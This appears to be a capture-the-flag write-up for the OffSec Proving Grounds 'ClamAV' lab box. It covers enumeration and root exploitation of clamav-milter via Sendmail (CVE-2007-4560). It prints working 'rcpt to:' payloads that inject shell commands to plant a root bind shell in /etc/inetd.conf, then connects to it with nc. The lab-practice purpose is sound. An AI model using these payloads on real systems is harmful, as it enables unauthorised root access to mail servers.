---
layout: writeup
name: "ClamAV"
platform: "ProvingGrounds"
category: "pg"
difficulty: "Easy"
permalink: /writeups/pg/clamav/
os: "OffSec Proving Grounds"
date: 2025-11-12
pwned: true
---
# 🧪 Machine Name: ClamAV

**Platform:** OffSec Proving Grounds  
**IP Address:** `192.168.228.42`  
**Difficulty:** Easy  

---

## 🕵️ Overview

ClamAV is an OffSec PG box that exposes several interesting services including an outdated mail setup with `clamav-milter`. After ruling out HTTP, SMB, and SNMP as dead-ends, we identify and exploit a remote root vulnerability in `clamav-milter` triggered through Sendmail. We confirm root with `proof.txt`, `hostname`, and `whoami`.

---

## 🔍 Enumeration

### 🔎 Nmap Full TCP Scan
```
nmap -p- --min-rate 10000 192.168.228.42

PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
80/tcp    open  http
139/tcp   open  netbios-ssn
199/tcp   open  smux
445/tcp   open  microsoft-ds
60000/tcp open  unknown
```

### 🔍 Nmap Targeted Enumeration
```
nmap -p 22,25,80,139,199,445,60000 -sC -sV -oN nmapscan 192.168.228.42

22/tcp  - OpenSSH 3.8.1p1
25/tcp  - Sendmail 8.13.4
80/tcp  - Apache 1.3.33 (Debian GNU/Linux)
445/tcp - Samba smbd 3.0.14a-Debian
199/tcp - Linux SNMP multiplexer
```

---

## 🔒 Service Enumeration

### 🚩 SMB (Guest access, no usable shares)
```
netexec smb 192.168.228.42 -u guest -p '' --shares
```
- No writable or interesting shares.

### 📄 HTTP
- Binary on main page decodes to: `ifyoudontpwnmeuran00b`
- Apache 1.3.33 found
- Dirbusting reveals only `/index.html` and standard 403s
- No RCE or LFI discovered

### 🔢 SNMP (UDP 161)
```bash
nmap -sU -p161 --script "*snmp*" 192.168.228.42
```
- SNMP is **misconfigured with community string `public`**
- Reveals clamav-milter and Sendmail processes

---

## ⚡ Exploitation

### 📄 CVE-2007-4560 – ClamAV Milter Remote Command Execution
- Found clamav-milter in SNMP output
- Vulnerability: Improper handling of Sendmail `rcpt to:` parsing can be used to append commands to `/etc/inetd.conf`
- Exploit reference: [CVE-2007-4560 – clamav-milter RCE via Sendmail](https://www.exploit-db.com/exploits/4761)

```bash
perl CVE-2007-4560.pl 192.168.228.42
```
Payload:
```bash
rcpt to: <nobody+"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf"@localhost>
rcpt to: <nobody+"|/etc/init.d/inetd restart"@localhost>
```

### 🔧 Root Access via Backdoor
```bash
nc -nv 192.168.228.42 31337
whoami    # root
hostname  # 0xbabe.local
cat proof.txt
a3c43c727ec533f1387ef24134c8cea1
```

---

## 💡 Lessons Learned
- `clamav-milter` RCE is rarely seen but extremely effective if exposed.
- SNMP misconfig (public string) provided process insights that led to the correct exploit.
- Services like `inetd` are uncommon but still exploitable on legacy systems.

---

## 📷 Proof
![ClamAV Proof](https://raw.githubusercontent.com/inkedqt/ctf-writeups/main/HTB/proofs/pg_clamav.png)

"Writeup and proof included in GitHub repo: https://github.com/inkedqt/ctf-writeups/tree/main/Other/PG/ClamAV"